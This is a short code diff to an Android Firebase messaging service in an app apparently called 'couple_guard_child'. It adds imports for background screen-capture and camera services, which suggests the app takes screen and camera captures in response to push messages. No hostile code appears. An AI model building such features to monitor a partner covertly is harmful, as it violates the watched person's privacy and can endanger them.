@@ -11,6 +11,8 @@ import android.os.Looper
 import com.google.android.gms.location.*
 import com.example.couple_guard_child.utils.ApiClient
 import kotlinx.coroutines.tasks.await
+import com.example.couple_guard_child.services.ScreenCaptureBackgroundService
+import com.example.couple_guard_child.services.CameraBackgroundService
 
 class MyFirebaseMessagingService : FirebaseMessagingService() {
 
